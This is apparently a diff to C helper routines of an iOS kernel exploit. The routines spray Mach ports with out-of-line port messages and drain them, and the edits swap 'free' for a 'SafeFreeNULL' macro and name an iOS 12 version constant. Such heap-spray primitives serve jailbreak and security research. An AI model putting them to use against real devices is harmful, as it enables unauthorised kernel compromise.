@@ -14,6 +14,7 @@
 #include "log.h"
 #include "parameters.h"
 #include "platform.h"
+#include "common.h"
 
 // Compute the minimum of 2 values.
 #define min(a, b) ((a) < (b) ? (a) : (b))
@@ -108,9 +109,7 @@ ool_ports_spray_port(mach_port_t holding_port,
 		}
 	}
 	// Clean up the allocated ports.
-	if (alloc_ports != NULL) {
-		free(alloc_ports);
-	}
+    SafeFreeNULL(alloc_ports);
 	// Return the number of messages we sent.
 	return messages_sent;
 }
@@ -357,7 +356,7 @@ ool_ports_spray_size_with_gc(mach_port_t *holding_ports, size_t *holding_port_co
 	for (; ports_used < port_count && ools_left > 0; ports_used++) {
 		// Spray this port one message at a time until we've maxed out its queue.
 		size_t messages_sent = 0;
-		for (; messages_sent < (kCFCoreFoundationVersionNumber >= 1535.12 ? MACH_PORT_QLIMIT_MAX : MACH_PORT_QLIMIT_DEFAULT) && ools_left > 0; messages_sent++) {
+		for (; messages_sent < (kCFCoreFoundationVersionNumber >= kCFCoreFoundationVersionNumber_iOS_12_0 ? MACH_PORT_QLIMIT_MAX : MACH_PORT_QLIMIT_DEFAULT) && ools_left > 0; messages_sent++) {
 			// If we've crossed the GC sleep boundary, sleep for a bit and schedule the
 			// next one.
 			if (sprayed >= next_gc_step) {
@@ -422,7 +421,7 @@ port_drain_messages(mach_port_t port, void (^message_handler)(mach_msg_header_t 
 			}
 			// The buffer was too small, increase it.
 			msg_size = msg->header.msgh_size + REQUESTED_TRAILER_SIZE(options);
-			free(msg);
+			SafeFreeNULL(msg);
 			msg = malloc(msg_size);
 			assert(msg != NULL);
 		}
@@ -439,7 +438,7 @@ port_drain_messages(mach_port_t port, void (^message_handler)(mach_msg_header_t 
 		message_handler(&msg->header);
 	}
 	// Clean up resources.
-	free(msg);
+    SafeFreeNULL(msg);
 }
 
 void
